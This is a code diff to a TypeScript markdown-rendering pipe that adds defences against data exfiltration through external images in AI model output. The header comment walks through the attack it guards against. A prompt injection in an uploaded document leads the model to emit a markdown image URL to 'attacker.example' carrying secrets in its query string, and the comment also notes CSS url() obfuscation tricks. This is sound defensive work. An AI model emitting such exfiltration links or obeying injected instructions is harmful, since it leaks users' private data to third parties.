@@ -145,6 +145,155 @@ function createKatexExtension(options: KatexOptions = {}): MarkedExtension {
 // Register KaTeX extension once at module load
 marked.use(createKatexExtension());
 
+/* ─────────────────────────────────────────────────────────────────────────────
+   External-image defang.
+
+   Rendered model output is HTML, and DOMPurify's html profile permits <img src>
+   to any origin. So `![](https://attacker.example/leak?q=secret)` in a reply is a
+   live exfiltration channel: the browser fetches it on render and the query string
+   carries whatever the model was induced to put there — which, after a prompt
+   injection inside an uploaded document, can be anything the model has seen.
+
+   Three layers, innermost first:
+     1. the marked image renderer below, which turns an external image into a
+        visible blocked badge, so the user is told rather than left with a broken
+        image;
+     2. the DOMPurify hooks, which catch an <img> or a background-image that
+        arrives as raw HTML in the model's output and so never passes through the
+        renderer;
+     3. the Content-Security-Policy's `img-src 'self' data:` from Stage A, which is
+        the backstop and the only layer that cannot be reasoned around.
+
+   Layer 3 alone would block the request silently. This file exists for the part a
+   header cannot do: saying what was blocked.
+   ───────────────────────────────────────────────────────────────────────────── */
+
+/** Whether a URL loads from this origin (or carries its own bytes) rather than reaching out. */
+function isLocalImageSource(href: string): boolean {
+  const url = (href || '').trim();
+  if (!url) return false;
+
+  // Its own bytes: no request leaves the browser, and the CSP allows data:.
+  if (/^data:image\//i.test(url)) return true;
+
+  // Protocol-relative (//host/path) is external however the page is served.
+  if (url.startsWith('//')) return false;
+
+  // Root-relative, or a fragment or query against the current document.
+  if (url.startsWith('/') || url.startsWith('#') || url.startsWith('?')) return true;
+
+  /* Anything with a scheme is external unless it resolves to this very origin.
+     javascript: and vbscript: land here too and are refused, though DOMPurify would
+     also strip them. */
+  if (/^[a-z][a-z0-9+.-]*:/i.test(url)) {
+    try {
+      return new URL(url).origin === window.location.origin;
+    } catch {
+      return false;
+    }
+  }
+
+  // A bare relative path.
+  return true;
+}
+
+/** The badge shown in place of a blocked image. */
+function blockedImageBadge(href: string, alt: string): string {
+  const label = alt && alt.trim().length > 0 ? alt.trim() : 'external image';
+  return '<span class="blocked-external-image" title="' + escapeHtmlAttribute(href) +
+    '">🚫 External image blocked: ' + escapeHtml(label) + '</span>';
+}
+
+function escapeHtml(value: string): string {
+  return value.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+}
+
+function escapeHtmlAttribute(value: string): string {
+  return escapeHtml(value).replace(/"/g, '&quot;').replace(/'/g, '&#39;');
+}
+
+/**
+ * True when a CSS declaration block can fetch a resource.
+ *
+ * Checked after CSS comments are removed and `\XX` escapes are decoded, because
+ * `url(...)` can be spelled `\75 rl(...)` or `ur/**\/l(...)` and still work.
+ */
+function styleCanFetch(style: string): boolean {
+  let value = (style || '').replace(/\/\*[\s\S]*?\*\//g, '');
+
+  // Decode CSS escapes: \75 , \0075, \u -> the character itself.
+  value = value.replace(/\\([0-9a-fA-F]{1,6})\s?/g, (_m, hex) => {
+    const code = parseInt(hex, 16);
+    return Number.isFinite(code) && code > 0 && code <= 0x10ffff ? String.fromCodePoint(code) : '';
+  });
+  value = value.replace(/\\(.)/g, '$1');
+
+  return /url\s*\(|image-set\s*\(|element\s*\(/i.test(value);
+}
+
+export const MARKDOWN_IMAGE_DEFANG_HOOKS_INSTALLED = installDefangHooks();
+
+function installDefangHooks(): boolean {
+  /* Renderer override. `marked.use` merges renderers, so this composes with the KaTeX
+     extension registered above rather than replacing it. */
+  marked.use({
+    renderer: {
+      image(token: any): string {
+        const href: string = (token && token.href) || '';
+        const alt: string = (token && token.text) || '';
+        const title: string = (token && token.title) || '';
+
+        if (!isLocalImageSource(href)) {
+          return blockedImageBadge(href, alt);
+        }
+
+        const titleAttr = title ? ' title="' + escapeHtmlAttribute(title) + '"' : '';
+        return '<img src="' + escapeHtmlAttribute(href) + '" alt="' + escapeHtmlAttribute(alt) + '"' + titleAttr + '>';
+      }
+    }
+  });
+
+  /* Hooks are global to the DOMPurify instance and are installed once at module load.
+     They cover the routes the renderer never sees: raw <img> in the model's HTML output,
+     srcset, the source/track family, and background-image in a style attribute. */
+  DOMPurify.addHook('uponSanitizeElement', (node: any, data: any) => {
+    if (data.tagName !== 'img' && data.tagName !== 'source' && data.tagName !== 'image') {
+      return;
+    }
+
+    const src: string = (node.getAttribute && node.getAttribute('src')) || '';
+    const srcset: string = (node.getAttribute && node.getAttribute('srcset')) || '';
+
+    const srcsetIsExternal = srcset
+      .split(',')
+      .map(candidate => candidate.trim().split(/\s+/)[0])
+      .filter(candidate => candidate.length > 0)
+      .some(candidate => !isLocalImageSource(candidate));
+
+    if ((src && !isLocalImageSource(src)) || srcsetIsExternal) {
+      /* Replaced rather than merely stripped of its src, so nothing is left behind that a
+         later stylesheet or attribute could point at a remote origin again. */
+      const replacement = node.ownerDocument.createElement('span');
+      replacement.setAttribute('class', 'blocked-external-image');
+      replacement.setAttribute('title', src || srcset);
+      replacement.textContent = '🚫 External image blocked';
+      node.parentNode?.replaceChild(replacement, node);
+    }
+  });
+
+  DOMPurify.addHook('uponSanitizeAttribute', (_node: any, data: any) => {
+    /* `style` is on the ADD_ATTR allowlist because KaTeX's output depends on inline styles
+       for its glyph metrics — removing it would break every rendered formula. So the value is
+       filtered instead: a declaration that can fetch a resource takes the whole attribute
+       with it, since a partial repair of CSS is not something to attempt by regex. */
+    if (data.attrName === 'style' && styleCanFetch(data.attrValue)) {
+      data.keepAttr = false;
+    }
+  });
+
+  return true;
+}
+
 @Pipe({
   name: 'markdown',
   standalone: true
